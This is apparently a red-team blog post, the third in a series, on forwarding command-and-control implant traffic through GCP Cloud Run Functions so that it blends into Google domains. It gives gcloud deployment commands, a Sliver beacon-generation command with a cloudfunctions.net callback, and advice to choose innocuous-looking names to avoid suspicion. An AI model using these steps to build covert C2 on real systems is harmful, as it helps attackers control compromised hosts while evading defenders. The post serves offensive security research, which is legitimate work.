---
layout: post
title:  "GCP Service Command and Control HTTP traffic forwarding part 3"
date:   2025-04-23 17:10:00 +1100
author: Stephen Bradshaw
tags:
- GCP
- Cloud Run Functions
- Cloud Run
- Serverless
- C2
- domain fronting
- forwarding
- container
- sliver
---

<p align="center">
  <img width="500" height="500" src="/assets/img/google_cloud_hack_3.png" alt="Google Cloud Hacker">
</p>

This is the third and likely final part in my series on abusing GCP services for C2 implant connectivity.

The previously released [part 1](/2023/08/30/aws-service-C2-forwarding.html) and [part 2](/2025/04/09/gcp-service-C2-forwarding-part-2.html) in the series are also available if you want to read them, with part 1 in particular worth having a look at to explain the rationale behind this technique and the basic environment requirements to make a working C2 system.

This time around, Im going to be talking about [Cloud Run Functions](https://cloud.google.com/functions).

# Cloud Run Functions

In a lot of ways, using Cloud Run Functions to forward C2 implant traffic operates similarly to the [Cloud Run](https://cloud.google.com/run) approach discussed in [part 1](/2025/03/26/gcp-service-C2-forwarding.html#google-cloud-run), with one interesting difference - the ability to access your app via an auto generated URL in the `cloudfunctions.net` domain.

The code for this approach is available [here](https://github.com/stephenbradshaw/GCPCloudRunFunctionsC2Forwarder). You will notice that this code is very similar to those used in the approaches discussed in previous parts of this series, with the main difference being that this code uses the [GCP functions framework](https://github.com/GoogleCloudPlatform/functions-framework-python) instad of Flask.

The difference between "Cloud Run" and "Cloud Run Functions" for C2 traffic forwarding results from the fact that we can actually deploy Cloud Run Functions via the gcloud CLI using two different subcommands `gcloud functions` and `gcloud run`. 

The `gcloud run` subcommand is the same one that we used to deploy the "Cloud Run" example app in part 1 of this series. From what I can tell, this is the newer combined deployment approach that can be used for both "Run" and "Run Function" apps. This method gives us access to new capabilities, such as the ability to route private VPC traffic via [Direct VPC egress](https://cloud.google.com/run/docs/configuring/vpc-direct-vpc). Deployed apps of either type are accessible at two different auto generated URLs under the `run.app` domain - a longer form that is provided in the CLI output as well as a shorter form viewable alongside the longer URL in the web console under the Network tab for the given app.

The `gcloud functions` subcommand appears to be older functionality, works just for "Run Function" apps (e.g. those using the GCP Functions Framework), and does not allow Direct VPC egress, instead requiring a [Serverless VPC connector](https://cloud.google.com/vpc/docs/serverless-vpc-access) to route private VPC traffic. It does however provide us access to our app via three different auto generated URLs instead of only two. Two of these URLs are the same as for the previous method and we then get an additional auto generated URL in the `cloudfunctions.net` domain.

We will look at examples of deploying a Run Function using each of the available approaches below.

First however, make sure you have completed all the supporting steps outlined in [part 1](/2025/03/26/gcp-service-C2-forwarding.html#gcp-c2-poc-environment), and enabled the APIs in your project for Cloud Run if you have not done so before (see commands below)

```
gcloud services enable run.googleapis.com
gcloud services enable cloudbuild.googleapis.com
```

Now lets look at the two deployment approaches, starting with the unique approach that gives us access to an additional reachable endpoint.

# Cloud Run Function Deployment using "gcloud functions"

In this deployment approach, we need to use a [Serverless VPC connector](https://cloud.google.com/vpc/docs/serverless-vpc-access) to allow internal traffic from our function to our C2 instance, similar to what we required when we used [Google App Engine in part 1](/2025/03/26/gcp-service-C2-forwarding.html#google-app-engine). Set this up in the same VPC and region as your C2 instance using the GCP web interface [here](https://console.cloud.google.com/networking/connectors/list).  I used the `10.8.0.0/28` unusued network range and called mine `testconnector`. 

Then, if it does not already exist, setup a [firewall rule](https://console.cloud.google.com/net-security/firewall-manager/firewall-policies/list) for the VPC which allows traffic from the VPC connectors private IP address range to port 80 on our C2 host. I handled this by creating a rule to allow all internal traffic from the range 10.0.0.0/8 (which included the IP range assigned to my testconnector VPC connector) to TCP port 80.


With that complete, we can then deploy our app using the gcloud CLI. 

To run the deployment, we need information on the following:
* A name for our function - this appears in the generated URLs so dont make it sounds too sus - Im using the value `imlegit`
* the internal IP address of our C2 host-  `10.128.0.2` in my case,
* the region we want to deploy in `us-central1`,
* our GCP project id `legitapp-24002`, and
* the full address of our VPC connector, comprised of the GCP project ID, region and connector name, in my case `projects/legitapp-24002/locations/us-central1/connectors/testconnector`


These get slotted into a deployment command like the following. Run this using a cloned copy of the previously mentioned [source code](https://github.com/stephenbradshaw/GCPCloudRunFunctionsC2Forwarder) as the present working directory.

```
gcloud functions deploy imlegit --source . --entry-point main --region us-central1 --runtime python312 --set-env-vars='DESTINATION=10.128.0.2' --trigger-http --allow-unauthenticated --vpc-connector 'projects/legitapp-24002/locations/us-central1/connectors/testconnector'
```


This will deploy when complete will output a URL similar in form to `https://us-central1-legitapp-24002.cloudfunctions.net/imlegit`, where your app will be available.

The architecture looks similar to the following.


<p align="center">
  <img src="/assets/img/c2_architecture_basic_crf.png" alt="C2 with Cloud Run Function Fronting">
</p>


You will note that in this case, the autogenerated URL for the app has pre-populated the chosen function name into the path component (`/imlegit`). This means that whatever C2 we use has to be able to generate its implants with this value pre-populated in the callback URL. In my POC, using [Sliver](https://github.com/BishopFox/sliver), I was able to generate implant binaries for Linux to connect to this endpoint using a command like the following:


```
generate beacon -a amd64 -o linux --http https://us-central1-legitapp-24002.cloudfunctions.net/imlegit/ -s /tmp/crf_beacon
```


As mentioned, there will also be two other auto generated URLs created for our app, which can be obtained from under the Network tab for the app in the [Cloud Run web interface](https://console.cloud.google.com/run).


My additional URLs looked like the following:
* `https://imlegit-983481234768.us-central1.run.app/`
* `https://imlegit-4egjweq6kq-uc.a.run.app/`



# Cloud Run Function Deployment using "gcloud run"

Now lets look at the alternate deployment approach, which results in something functionally similar to the Cloud Run example we look at in [part 1](/2025/03/26/gcp-service-C2-forwarding.html#google-cloud-run).

This approach can use [Direct VPC egress](https://cloud.google.com/run/docs/configuring/vpc-direct-vpc) to allow private traffic flow, so we can do without the Serverless VPC. We will specify the subnet identifier that the C2 instance is running in when we do the deployment so the container that Cloud Run creates runs there for connectivity purposes.


The parameters we will use are:
* A different name for the app - Im going with `toteslegit` like I did in the original Cloud Run example,
* the internal IP address of our C2 host `10.128.0.2`,
* the region we want to deploy in `us-central1`,
* our GCP project id `legitapp-24002`, and
* a subnet to connect the apps container to for network access `projects/legitapp-24002/regions/us-central1/subnetworks/default`


The command looks like the following, run with the cloned [source code](https://github.com/stephenbradshaw/GCPCloudRunFunctionsC2Forwarder) as the present working directory.


```
gcloud run deploy toteslegit --source . --function main --set-env-vars='DESTINATION=10.128.0.2' --region=us-central1 --subnet='projects/legitapp-24002/regions/us-central1/subnetworks/default' --allow-unauthenticated
```

The deployment will spit out a URL similar to `https://toteslegit-983481234768.us-central1.run.app` where our app will then be accessible. 


The architecture looks similar to the following.


<p align="center">
  <img src="/assets/img/c2_architecture_basic_crf2.png" alt="C2 with Cloud Run Function Fronting Alt Method">
</p>


The Network tab for the app in the [Cloud Run web interface](https://console.cloud.google.com/run) will also give us information on the additional auto generated app URL, which in my case was `https://toteslegit-4egjweq6kq-uc.a.run.app/`.


# Conclusion

I believe at this point I have largely exhausted the suitable looking possibilities for abusing GCP services for C2 fronting, so this will likely be the last part in this series. However, if you are aware of any other services that I have missed that could be misused in this way, please let me know and I'll do another follow up.
